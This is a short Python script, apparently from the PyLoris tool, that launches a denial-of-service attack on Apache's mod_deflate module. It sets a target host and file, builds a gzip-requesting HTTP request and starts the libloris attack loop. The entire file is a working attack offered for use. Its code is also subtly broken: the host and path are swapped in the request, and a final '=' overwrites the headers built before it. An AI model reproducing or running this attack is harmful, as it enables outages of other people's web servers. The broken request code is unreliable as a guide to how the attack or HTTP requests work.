#! /usr/bin/env python

"""
scriptloris_defalte.py
A quick script to exploit a mod_deflate DoS vulnerability described on the
dev@httpd.apache.org mailing list.

http://www.mail-archive.com/dev@httpd.apache.org/msg44323.html
"""

host = 'www.example.com'
port = 80
filename = '/large/file.txt'

from libloris import *

def main(host, port, filename):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET %s HTTP/1.1\r\n' % (host)
    loris.options['request'] += 'Host: %s\r\n' % (filename)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_deflate.py) (http://pyloris.sf.net/)\r\n'
    loris.options['request'] = 'Accept-Encoding: gzip\r\n\r\n'

    loris.options['attacklimit'] = 0
    loris.options['connectionlimit'] = 8
    loris.options['threadlimit'] = 2
    loris.options['timebetweenthreads'] = 0
    loris.options['timebetweenconnections'] = 1
    loris.options['quitimmediately'] = True

    loris.mainloop()

if __name__ == "__main__":
    main(host, port, filename)
    